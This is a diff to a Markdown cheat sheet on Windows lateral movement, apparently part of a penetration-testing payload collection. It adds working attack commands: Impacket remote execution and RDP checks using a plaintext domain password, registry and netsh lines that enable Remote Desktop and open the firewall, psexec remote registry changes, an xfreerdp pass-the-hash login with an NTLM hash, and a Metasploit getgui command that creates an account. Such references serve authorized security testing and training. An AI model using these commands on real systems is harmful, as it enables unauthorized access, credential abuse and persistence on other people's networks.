@@ -68,16 +68,20 @@ python wmiexec.py CSCOU/jarrieta:nastyCutt3r@10.9.122.5
 ```
 
 ## RDP Remote Desktop Protocol (Impacket)
-```
+```powershell
 python rdpcheck.py CSCOU/jarrieta:nastyCutt3r@10.9.122.5
 rdesktop -d CSCOU -u jarrieta -p nastyCutt3r 10.9.122.5
 ```
+
 Note: you may need to enable it with the following command
-```
+```powershell
 reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f
+netsh firewall set service remoteadmin enable
+netsh firewall set service remotedesktop enable
 ```
+
 or with psexec(sysinternals)
-```
+```powershell
 psexec \\machinename reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
 ```
 
@@ -85,6 +89,12 @@ For Server 2012 R2, Win8.1+
 ```
 xfreerdp /u:offsec /d:win2012 /pth:88a405e17c0aa5debbc9b5679753939d /v:192.168.1.12
 ```
+
+with Metasploit
+```powershell
+run getgui -u admin -p 1234
+```
+
 
 ## Netuse (Windows)
 ```
